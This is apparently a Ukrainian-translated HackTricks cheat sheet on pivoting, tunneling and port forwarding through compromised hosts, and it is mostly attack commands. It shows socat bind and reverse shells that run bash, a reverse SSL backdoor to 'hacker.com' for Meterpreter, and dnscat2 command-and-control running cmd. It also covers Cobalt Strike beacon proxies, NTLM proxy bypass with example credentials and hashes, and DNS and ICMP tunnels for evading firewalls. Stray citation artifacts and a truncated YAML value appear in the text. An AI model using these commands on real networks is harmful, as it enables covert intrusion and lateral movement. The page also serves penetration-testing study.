# Tunneling and Port Forwarding

{{#include ../banners/hacktricks-training.md}}

## Nmap tip

> [!WARNING]
> **ICMP** та **SYN** сканування не можуть бути тунельовані через socks проксі, тому ми повинні **вимкнути виявлення ping** (`-Pn`) і вказати **TCP сканування** (`-sT`), щоб це працювало.

## **Bash**

**Host -> Jump -> InternalA -> InternalB**
```bash
# On the jump server connect the port 3333 to the 5985
mknod backpipe p;
nc -lvnp 5985 0<backpipe | nc -lvnp 3333 1>backpipe

# On InternalA accessible from Jump and can access InternalB
## Expose port 3333 and connect it to the winrm port of InternalB
exec 3<>/dev/tcp/internalB/5985
exec 4<>/dev/tcp/Jump/3333
cat <&3 >&4 &
cat <&4 >&3 &

# From the host, you can now access InternalB from the Jump server
evil-winrm -u username -i Jump
```
## **SSH**

SSH графічне з'єднання (X)
```bash
ssh -Y -C <user>@<ip> #-Y is less secure but faster than -X
```
### Local Port2Port

Відкрийте новий порт на SSH сервері --> Інший порт
```bash
ssh -R 0.0.0.0:10521:127.0.0.1:1521 user@10.0.0.1 #Local port 1521 accessible in port 10521 from everywhere
```

```bash
ssh -R 0.0.0.0:10521:10.0.0.1:1521 user@10.0.0.1 #Remote port 1521 accessible in port 10521 from everywhere
```
### Port2Port

Локальний порт --> Скомпрометований хост (SSH) --> Третій_бокс:Порт
```bash
ssh -i ssh_key <user>@<ip_compromised> -L <attacker_port>:<ip_victim>:<remote_port> [-p <ssh_port>] [-N -f]  #This way the terminal is still in your host
#Example
sudo ssh -L 631:<ip_victim>:631 -N -f -l <username> <ip_compromised>
```
### Port2hostnet (proxychains)

Локальний порт --> Скомпрометований хост (SSH) --> Куди завгодно
```bash
ssh -f -N -D <attacker_port> <username>@<ip_compromised> #All sent to local port will exit through the compromised server (use as proxy)
```
### Зворотне перенаправлення портів

Це корисно для отримання зворотних шелів з внутрішніх хостів через DMZ до вашого хоста:
```bash
ssh -i dmz_key -R <dmz_internal_ip>:443:0.0.0.0:7000 root@10.129.203.111 -vN
# Now you can send a rev to dmz_internal_ip:443 and capture it in localhost:7000
# Note that port 443 must be open
# Also, remmeber to edit the /etc/ssh/sshd_config file on Ubuntu systems
# and change the line "GatewayPorts no" to "GatewayPorts yes"
# to be able to make ssh listen in non internal interfaces in the victim (443 in this case)
```
### VPN-Tunnel

Вам потрібен **root на обох пристроях** (оскільки ви збираєтеся створити нові інтерфейси) і конфігурація sshd повинна дозволяти вхід для root:\
`PermitRootLogin yes`\
`PermitTunnel yes`
```bash
ssh root@server -w any:any #This will create Tun interfaces in both devices
ip addr add 1.1.1.2/32 peer 1.1.1.1 dev tun0 #Client side VPN IP
ifconfig tun0 up #Activate the client side network interface
ip addr add 1.1.1.1/32 peer 1.1.1.2 dev tun0 #Server side VPN IP
ifconfig tun0 up #Activate the server side network interface
```
Увімкніть пересилання на стороні сервера
```bash
echo 1 > /proc/sys/net/ipv4/ip_forward
iptables -t nat -A POSTROUTING -s 1.1.1.2 -o eth0 -j MASQUERADE
```
Встановіть новий маршрут на стороні клієнта
```
route add -net 10.0.0.0/16 gw 1.1.1.1
```
> [!NOTE]
> **Безпека – Атака Terrapin (CVE-2023-48795)**
> Атака з пониженням Terrapin 2023 року може дозволити зловмиснику в середньому положенні втручатися в ранній SSH-рукопожаття та впроваджувати дані в **будь-який перенаправлений канал** ( `-L`, `-R`, `-D` ). Переконайтеся, що як клієнт, так і сервер оновлені ( **OpenSSH ≥ 9.6/LibreSSH 6.7** ) або явно вимкніть вразливі алгоритми `chacha20-poly1305@openssh.com` та `*-etm@openssh.com` у `sshd_config`/`ssh_config` перед тим, як покладатися на SSH-тунелі. citeturn4search0

## SSHUTTLE

Ви можете **тунелювати** через **ssh** весь **трафік** до **підмережі** через хост.\
Наприклад, перенаправлення всього трафіку, що йде до 10.10.10.0/24
```bash
pip install sshuttle
sshuttle -r user@host 10.10.10.10/24
```
Підключитися за допомогою приватного ключа
```bash
sshuttle -D -r user@host 10.10.10.10 0/0 --ssh-cmd 'ssh -i ./id_rsa'
# -D : Daemon mode
```
## Meterpreter

### Port2Port

Локальний порт --> Скомпрометований хост (активна сесія) --> Третій_бокс:Порт
```bash
# Inside a meterpreter session
portfwd add -l <attacker_port> -p <Remote_port> -r <Remote_host>
```
### SOCKS
```bash
background# meterpreter session
route add <IP_victim> <Netmask> <Session> # (ex: route add 10.10.10.14 255.255.255.0 8)
use auxiliary/server/socks_proxy
run #Proxy port 1080 by default
echo "socks4 127.0.0.1 1080" > /etc/proxychains.conf #Proxychains
```
Інший спосіб:
```bash
background #meterpreter session
use post/multi/manage/autoroute
set SESSION <session_n>
set SUBNET <New_net_ip> #Ex: set SUBNET 10.1.13.0
set NETMASK <Netmask>
run
use auxiliary/server/socks_proxy
set VERSION 4a
run #Proxy port 1080 by default
echo "socks4 127.0.0.1 1080" > /etc/proxychains.conf #Proxychains
```
## Cobalt Strike

### SOCKS proxy

Відкрийте порт на сервері команди, який слухає на всіх інтерфейсах, що може бути використаний для **маршрутизації трафіку через маяк**.
```bash
beacon> socks 1080
[+] started SOCKS4a server on: 1080

# Set port 1080 as proxy server in proxychains.conf
proxychains nmap -n -Pn -sT -p445,3389,5985 10.10.17.25
```
### rPort2Port

> [!WARNING]
> У цьому випадку **порт відкритий на хості маяка**, а не на сервері команди, і трафік надсилається на сервер команди, а звідти на вказаний хост:порт
```bash
rportfwd [bind port] [forward host] [forward port]
rportfwd stop [bind port]
```
Зверніть увагу:

- Зворотний портовий переадресатор Beacon призначений для **тунелювання трафіку до Team Server, а не для пересилання між окремими машинами**.
- Трафік **тунелюється в межах C2 трафіку Beacon**, включаючи P2P посилання.
- **Привілеї адміністратора не потрібні** для створення зворотних портових переадресаторів на високих портах.

### rPort2Port локальний

> [!WARNING]
> У цьому випадку **порт відкривається на хості beacon**, а не на Team Server, і **трафік надсилається до клієнта Cobalt Strike** (не до Team Server) і звідти до вказаного хоста:порту.
```bash
rportfwd_local [bind port] [forward host] [forward port]
rportfwd_local stop [bind port]
```
## reGeorg

[https://github.com/sensepost/reGeorg](https://github.com/sensepost/reGeorg)

Вам потрібно завантажити веб-файл тунель: ashx|aspx|js|jsp|php|php|jsp
```bash
python reGeorgSocksProxy.py -p 8080 -u http://upload.sensepost.net:8080/tunnel/tunnel.jsp
```
## Chisel

Ви можете завантажити його з сторінки релізів [https://github.com/jpillora/chisel](https://github.com/jpillora/chisel)\
Вам потрібно використовувати **ту ж версію для клієнта та сервера**

### socks
```bash
./chisel server -p 8080 --reverse #Server -- Attacker
./chisel-x64.exe client 10.10.14.3:8080 R:socks #Client -- Victim
#And now you can use proxychains with port 1080 (default)

./chisel server -v -p 8080 --socks5 #Server -- Victim (needs to have port 8080 exposed)
./chisel client -v 10.10.10.10:8080 socks #Attacker
```
### Переадресація портів
```bash
./chisel_1.7.6_linux_amd64 server -p 12312 --reverse #Server -- Attacker
./chisel_1.7.6_linux_amd64 client 10.10.14.20:12312 R:4505:127.0.0.1:4505 #Client -- Victim
```
## Ligolo-ng

[https://github.com/nicocha30/ligolo-ng](https://github.com/nicocha30/ligolo-ng)

**Використовуйте ту ж версію для агента та проксі**

### Тунелювання
```bash
# Start proxy server and automatically generate self-signed TLS certificates -- Attacker
sudo ./proxy -selfcert
# Create an interface named "ligolo" -- Attacker
interface_create --name "ligolo"
# Print the currently used certificate fingerprint -- Attacker
certificate_fingerprint
# Start the agent with certification validation -- Victim
./agent -connect <ip_proxy>:11601 -v -accept-fingerprint <fingerprint>
# Select the agent -- Attacker
session
1
# Start the tunnel on the proxy server -- Attacker
tunnel_start --tun "ligolo"
# Display the agent's network configuration -- Attacker
ifconfig
# Create a route to the agent's specified network -- Attacker
interface_add_route --name "ligolo" --route <network_address_agent>/<netmask_agent>
# Display the tun interfaces -- Attacker
interface_list
```
### Прив'язка агента та прослуховування
```bash
# Establish a tunnel from the proxy server to the agent
# Create a TCP listening socket on the agent (0.0.0.0) on port 30000 and forward incoming TCP connections to the proxy (127.0.0.1) on port 10000 -- Attacker
listener_add --addr 0.0.0.0:30000 --to 127.0.0.1:10000 --tcp
# Display the currently running listeners on the agent -- Attacker
listener_list
```
### Доступ до локальних портів агента
```bash
# Establish a tunnel from the proxy server to the agent
# Create a route to redirect traffic for 240.0.0.1 to the Ligolo-ng interface to access the agent's local services -- Attacker
interface_add_route --name "ligolo" --route 240.0.0.1/32
```
## Rpivot

[https://github.com/klsecservices/rpivot](https://github.com/klsecservices/rpivot)

Зворотний тунель. Тунель запускається з жертви.\
Створюється socks4 проксі на 127.0.0.1:1080
```bash
attacker> python server.py --server-port 9999 --server-ip 0.0.0.0 --proxy-ip 127.0.0.1 --proxy-port 1080
```

```bash
victim> python client.py --server-ip <rpivot_server_ip> --server-port 9999
```
Поворот через **NTLM proxy**
```bash
victim> python client.py --server-ip <rpivot_server_ip> --server-port 9999 --ntlm-proxy-ip <proxy_ip> --ntlm-proxy-port 8080 --domain CONTOSO.COM --username Alice --password P@ssw0rd
```

```bash
victim> python client.py --server-ip <rpivot_server_ip> --server-port 9999 --ntlm-proxy-ip <proxy_ip> --ntlm-proxy-port 8080 --domain CONTOSO.COM --username Alice --hashes 9b9850751be2515c8231e5189015bbe6:49ef7638d69a01f26d96ed673bf50c45
```
## **Socat**

[https://github.com/andrew-d/static-binaries](https://github.com/andrew-d/static-binaries)

### Прив'язати оболонку
```bash
victim> socat TCP-LISTEN:1337,reuseaddr,fork EXEC:bash,pty,stderr,setsid,sigint,sane
attacker> socat FILE:`tty`,raw,echo=0 TCP4:<victim_ip>:1337
```
### Реверс-шелл
```bash
attacker> socat TCP-LISTEN:1337,reuseaddr FILE:`tty`,raw,echo=0
victim> socat TCP4:<attackers_ip>:1337 EXEC:bash,pty,stderr,setsid,sigint,sane
```
### Port2Port
```bash
socat TCP4-LISTEN:<lport>,fork TCP4:<redirect_ip>:<rport> &
```
### Port2Port через socks
```bash
socat TCP4-LISTEN:1234,fork SOCKS4A:127.0.0.1:google.com:80,socksport=5678
```
### Meterpreter через SSL Socat
```bash
#Create meterpreter backdoor to port 3333 and start msfconsole listener in that port
attacker> socat OPENSSL-LISTEN:443,cert=server.pem,cafile=client.crt,reuseaddr,fork,verify=1 TCP:127.0.0.1:3333
```

```bash
victim> socat.exe TCP-LISTEN:2222 OPENSSL,verify=1,cert=client.pem,cafile=server.crt,connect-timeout=5|TCP:hacker.com:443,connect-timeout=5
#Execute the meterpreter
```
Ви можете обійти **неавторизований проксі**, виконавши цей рядок замість останнього в консолі жертви:
```bash
OPENSSL,verify=1,cert=client.pem,cafile=server.crt,connect-timeout=5|PROXY:hacker.com:443,connect-timeout=5|TCP:proxy.lan:8080,connect-timeout=5
```
[https://funoverip.net/2011/01/reverse-ssl-backdoor-with-socat-and-metasploit/](https://funoverip.net/2011/01/reverse-ssl-backdoor-with-socat-and-metasploit/)

### SSL Socat Tunnel

**/bin/sh console**

Створіть сертифікати з обох сторін: Клієнт і Сервер
```bash
# Execute these commands on both sides
FILENAME=socatssl
openssl genrsa -out $FILENAME.key 1024
openssl req -new -key $FILENAME.key -x509 -days 3653 -out $FILENAME.crt
cat $FILENAME.key $FILENAME.crt >$FILENAME.pem
chmod 600 $FILENAME.key $FILENAME.pem
```

```bash
attacker-listener> socat OPENSSL-LISTEN:433,reuseaddr,cert=server.pem,cafile=client.crt EXEC:/bin/sh
victim> socat STDIO OPENSSL-CONNECT:localhost:433,cert=client.pem,cafile=server.crt
```
### Remote Port2Port

Підключіть локальний SSH порт (22) до порту 443 хоста атакуючого
```bash
attacker> sudo socat TCP4-LISTEN:443,reuseaddr,fork TCP4-LISTEN:2222,reuseaddr #Redirect port 2222 to port 443 in localhost
victim> while true; do socat TCP4:<attacker>:443 TCP4:127.0.0.1:22 ; done # Establish connection with the port 443 of the attacker and everything that comes from here is redirected to port 22
attacker> ssh localhost -p 2222 -l www-data -i vulnerable #Connects to the ssh of the victim
```
## Plink.exe

Це як консольна версія PuTTY (опції дуже схожі на клієнт ssh).

Оскільки цей бінар буде виконуватись на жертві і є клієнтом ssh, нам потрібно відкрити наш сервіс ssh і порт, щоб ми могли отримати зворотне з'єднання. Потім, щоб перенаправити лише локально доступний порт на порт у нашій машині:
```bash
echo y | plink.exe -l <Our_valid_username> -pw <valid_password> [-p <port>] -R <port_ in_our_host>:<next_ip>:<final_port> <your_ip>
echo y | plink.exe -l root -pw password [-p 2222] -R 9090:127.0.0.1:9090 10.11.0.41 #Local port 9090 to out port 9090
```
## Windows netsh

### Port2Port

Вам потрібно бути локальним адміністратором (для будь-якого порту)
```bash
netsh interface portproxy add v4tov4 listenaddress= listenport= connectaddress= connectport= protocol=tcp
# Example:
netsh interface portproxy add v4tov4 listenaddress=0.0.0.0 listenport=4444 connectaddress=10.10.10.10 connectport=4444
# Check the port forward was created:
netsh interface portproxy show v4tov4
# Delete port forward
netsh interface portproxy delete v4tov4 listenaddress=0.0.0.0 listenport=4444
```
## SocksOverRDP & Proxifier

Вам потрібно мати **доступ до RDP через систему**.\
Завантажте:

1. [SocksOverRDP x64 Binaries](https://github.com/nccgroup/SocksOverRDP/releases) - Цей інструмент використовує `Dynamic Virtual Channels` (`DVC`) з функції Remote Desktop Service Windows. DVC відповідає за **тунелювання пакетів через RDP з'єднання**.
2. [Proxifier Portable Binary](https://www.proxifier.com/download/#win-tab)

На вашому клієнтському комп'ютері завантажте **`SocksOverRDP-Plugin.dll`** ось так:
```bash
# Load SocksOverRDP.dll using regsvr32.exe
C:\SocksOverRDP-x64> regsvr32.exe SocksOverRDP-Plugin.dll
```
Тепер ми можемо **підключитися** до **жертви** через **RDP** за допомогою **`mstsc.exe`**, і ми повинні отримати **підказку**, що **плагін SocksOverRDP увімкнено**, і він буде **прослуховувати** на **127.0.0.1:1080**.

**Підключіться** через **RDP** та завантажте і виконайте на машині жертви бінарний файл `SocksOverRDP-Server.exe`:
```
C:\SocksOverRDP-x64> SocksOverRDP-Server.exe
```
Тепер підтвердіть на вашій машині (атакуючого), що порт 1080 слухає:
```
netstat -antb | findstr 1080
```
Тепер ви можете використовувати [**Proxifier**](https://www.proxifier.com/) **для проксування трафіку через цей порт.**

## Проксування Windows GUI додатків

Ви можете налаштувати Windows GUI додатки для роботи через проксі, використовуючи [**Proxifier**](https://www.proxifier.com/).\
У **Profile -> Proxy Servers** додайте IP-адресу та порт SOCKS сервера.\
У **Profile -> Proxification Rules** додайте назву програми для проксування та з'єднання з IP-адресами, які ви хочете проксувати.

## Обхід NTLM проксі

Раніше згадуваний інструмент: **Rpivot**\
**OpenVPN** також може обійти це, встановивши ці параметри у файлі конфігурації:
```bash
http-proxy <proxy_ip> 8080 <file_with_creds> ntlm
```
### Cntlm

[http://cntlm.sourceforge.net/](http://cntlm.sourceforge.net/)

Він аутентифікується проти проксі-сервера та прив'язує порт локально, який перенаправляється на зовнішній сервіс, який ви вказуєте. Потім ви можете використовувати інструмент на ваш вибір через цей порт.\
Наприклад, перенаправити порт 443
```
Username Alice
Password P@ssw0rd
Domain CONTOSO.COM
Proxy 10.0.0.10:8080
Tunnel 2222:<attackers_machine>:443
```
Тепер, якщо ви налаштуєте, наприклад, на жертві службу **SSH** для прослуховування на порту 443. Ви можете підключитися до неї через порт атакуючого 2222.\
Ви також можете використовувати **meterpreter**, який підключається до localhost:443, а атакуючий прослуховує на порту 2222.

## YARP

Реверсний проксі, створений Microsoft. Ви можете знайти його тут: [https://github.com/microsoft/reverse-proxy](https://github.com/microsoft/reverse-proxy)

## DNS Tunneling

### Iodine

[https://code.kryo.se/iodine/](https://code.kryo.se/iodine/)

Root потрібен в обох системах для створення tun адаптерів і тунелювання даних між ними за допомогою DNS запитів.
```
attacker> iodined -f -c -P P@ssw0rd 1.1.1.1 tunneldomain.com
victim> iodine -f -P P@ssw0rd tunneldomain.com -r
#You can see the victim at 1.1.1.2
```
Тунель буде дуже повільним. Ви можете створити стиснуте SSH з'єднання через цей тунель, використовуючи:
```
ssh <user>@1.1.1.2 -C -c blowfish-cbc,arcfour -o CompressionLevel=9 -D 1080
```
### DNSCat2

[**Завантажте його звідси**](https://github.com/iagox86/dnscat2)**.**

Встановлює канал C\&C через DNS. Не потребує прав root.
```bash
attacker> ruby ./dnscat2.rb tunneldomain.com
victim> ./dnscat2 tunneldomain.com

# If using it in an internal network for a CTF:
attacker> ruby dnscat2.rb --dns host=10.10.10.10,port=53,domain=mydomain.local --no-cache
victim> ./dnscat2 --dns host=10.10.10.10,port=5353
```
#### **У PowerShell**

Ви можете використовувати [**dnscat2-powershell**](https://github.com/lukebaggett/dnscat2-powershell) для запуску клієнта dnscat2 у powershell:
```
Import-Module .\dnscat2.ps1
Start-Dnscat2 -DNSserver 10.10.10.10 -Domain mydomain.local -PreSharedSecret somesecret -Exec cmd
```
#### **Переадресація портів з dnscat**
```bash
session -i <sessions_id>
listen [lhost:]lport rhost:rport #Ex: listen 127.0.0.1:8080 10.0.0.20:80, this bind 8080port in attacker host
```
#### Зміна DNS у proxychains

Proxychains перехоплює виклик `gethostbyname` libc і тунелює tcp DNS запит через socks проксі. За **замовчуванням** DNS сервер, який використовує proxychains, є **4.2.2.2** (жорстко закодований). Щоб змінити його, відредагуйте файл: _/usr/lib/proxychains3/proxyresolv_ і змініть IP. Якщо ви в **середовищі Windows**, ви можете встановити IP **контролера домену**.

## Тунелі в Go

[https://github.com/hotnops/gtunnel](https://github.com/hotnops/gtunnel)

## ICMP Тунелювання

### Hans

[https://github.com/friedrich/hans](https://github.com/friedrich/hans)\
[https://github.com/albertzak/hanstunnel](https://github.com/albertzak/hanstunnel)

Root потрібен в обох системах для створення tun адаптерів і тунелювання даних між ними за допомогою ICMP echo запитів.
```bash
./hans -v -f -s 1.1.1.1 -p P@ssw0rd #Start listening (1.1.1.1 is IP of the new vpn connection)
./hans -f -c <server_ip> -p P@ssw0rd -v
ping 1.1.1.100 #After a successful connection, the victim will be in the 1.1.1.100
```
### ptunnel-ng

[**Завантажте його звідси**](https://github.com/utoni/ptunnel-ng.git).
```bash
# Generate it
sudo ./autogen.sh

# Server -- victim (needs to be able to receive ICMP)
sudo ptunnel-ng
# Client - Attacker
sudo ptunnel-ng -p <server_ip> -l <listen_port> -r <dest_ip> -R <dest_port>
# Try to connect with SSH through ICMP tunnel
ssh -p 2222 -l user 127.0.0.1
# Create a socks proxy through the SSH connection through the ICMP tunnel
ssh -D 9050 -p 2222 -l user 127.0.0.1
```
## ngrok

[**ngrok**](https://ngrok.com/) **є інструментом для експонування рішень в Інтернеті в один рядок команди.**\
_Експозиційні URI виглядають так:_ **UID.ngrok.io**

### Встановлення

- Створіть обліковий запис: https://ngrok.com/signup
- Завантаження клієнта:
```bash
tar xvzf ~/Downloads/ngrok-v3-stable-linux-amd64.tgz -C /usr/local/bin
chmod a+x ./ngrok
# Init configuration, with your token
./ngrok config edit
```
### Основні використання

**Документація:** [https://ngrok.com/docs/getting-started/](https://ngrok.com/docs/getting-started/).

_Також можливо додати аутентифікацію та TLS, якщо це необхідно._

#### Тунелювання TCP
```bash
# Pointing to 0.0.0.0:4444
./ngrok tcp 4444
# Example of resulting link: 0.tcp.ngrok.io:12345
# Listen (example): nc -nvlp 4444
# Remote connect (example): nc $(dig +short 0.tcp.ngrok.io) 12345
```
#### Відкриття файлів за допомогою HTTP
```bash
./ngrok http file:///tmp/httpbin/
# Example of resulting link: https://abcd-1-2-3-4.ngrok.io/
```
#### Sniffing HTTP calls

_Корисно для XSS, SSRF, SSTI ..._\
Безпосередньо з stdout або в HTTP інтерфейсі [http://127.0.0.1:4040](http://127.0.0.1:4000).

#### Tunneling internal HTTP service
```bash
./ngrok http localhost:8080 --host-header=rewrite
# Example of resulting link: https://abcd-1-2-3-4.ngrok.io/
# With basic auth
./ngrok http localhost:8080 --host-header=rewrite --auth="myuser:mysuperpassword"
```
#### ngrok.yaml простий приклад конфігурації

Він відкриває 3 тунелі:

- 2 TCP
- 1 HTTP з експозицією статичних файлів з /tmp/httpbin/
```yaml
tunnels:
mytcp:
addr: 4444
proto: tcptunne
anothertcp:
addr: 5555
proto: tcp
httpstatic:
proto: http
addr: file:///tmp/httpbin/
```
## Cloudflared (Cloudflare Tunnel)

Демон `cloudflared` від Cloudflare може створювати вихідні тунелі, які відкривають **локальні TCP/UDP сервіси** без необхідності вхідних правил брандмауера, використовуючи край Cloudflare як місце зустрічі. Це дуже зручно, коли вихідний брандмауер дозволяє лише HTTPS-трафік, але вхідні з'єднання заблоковані.

### Quick tunnel one-liner
```bash
# Expose a local web service listening on 8080
cloudflared tunnel --url http://localhost:8080
# => Generates https://<random>.trycloudflare.com that forwards to 127.0.0.1:8080
```
### SOCKS5 півот
```bash
# Turn the tunnel into a SOCKS5 proxy on port 1080
cloudflared tunnel --url socks5://localhost:1080 --socks5
# Now configure proxychains to use 127.0.0.1:1080
```
### Постійні тунелі з DNS
```bash
cloudflared tunnel create mytunnel
cloudflared tunnel route dns mytunnel internal.example.com
# config.yml
Tunnel: <TUNNEL-UUID>
credentials-file: /root/.cloudflared/<TUNNEL-UUID>.json
url: http://127.0.0.1:8000
```
Запустіть з'єднувач:
```bash
cloudflared tunnel run mytunnel
```
Оскільки весь трафік виходить з хоста **вихідний через 443**, тунелі Cloudflared є простим способом обійти вхідні ACL або межі NAT. Зверніть увагу, що бінарний файл зазвичай працює з підвищеними привілеями – використовуйте контейнери або прапор `--user`, коли це можливо. citeturn1search0

## FRP (Швидкий зворотний проксі)

[`frp`](https://github.com/fatedier/frp) – це активно підтримуваний зворотний проксі на Go, який підтримує **TCP, UDP, HTTP/S, SOCKS та P2P NAT-hole-punching**. Починаючи з **v0.53.0 (травень 2024)**, він може діяти як **SSH Tunnel Gateway**, тому цільовий хост може створити зворотний тунель, використовуючи лише стандартний клієнт OpenSSH – додатковий бінарний файл не потрібен.

### Класичний зворотний TCP тунель
```bash
# Attacker / server
./frps -c frps.toml            # listens on 0.0.0.0:7000

# Victim
./frpc -c frpc.toml            # will expose 127.0.0.1:3389 on frps:5000

# frpc.toml
serverAddr = "attacker_ip"
serverPort = 7000

[[proxies]]
name       = "rdp"
type       = "tcp"
localIP    = "127.0.0.1"
localPort  = 3389
remotePort = 5000
```
### Використання нового SSH шлюзу (без бінарного frpc)
```bash
# On frps (attacker)
sshTunnelGateway.bindPort = 2200   # add to frps.toml
./frps -c frps.toml

# On victim (OpenSSH client only)
ssh -R :80:127.0.0.1:8080 v0@attacker_ip -p 2200 tcp --proxy_name web --remote_port 9000
```
Вищезазначена команда публікує порт жертви **8080** як **attacker_ip:9000** без розгортання будь-яких додаткових інструментів – ідеально для живого використання ресурсів. citeturn2search1

## Інші інструменти для перевірки

- [https://github.com/securesocketfunneling/ssf](https://github.com/securesocketfunneling/ssf)
- [https://github.com/z3APA3A/3proxy](https://github.com/z3APA3A/3proxy)

{{#include ../banners/hacktricks-training.md}}
